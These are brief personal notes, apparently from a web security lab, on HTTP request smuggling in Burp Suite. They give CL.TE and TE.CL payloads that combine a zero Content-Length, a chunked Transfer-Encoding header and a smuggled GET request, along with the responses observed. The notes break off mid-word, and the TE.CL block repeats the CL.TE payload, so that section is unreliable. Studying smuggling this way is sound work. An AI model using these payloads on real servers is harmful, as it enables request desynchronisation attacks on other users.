____

HTTP /1
Change request method 

We have to receive HTTP /1 200 OK 

Extension: HTTP Request Smuggler -> Launch all scans
# CL.TE

```
Content-Length: 0
Transfer-encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Sent 2 times. The 2nd time 404

x= 
# TE.CL

```
Content-Length: 0
Transfer-encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

500 Internal Server Error

Repeater --> uncheck Update Conte


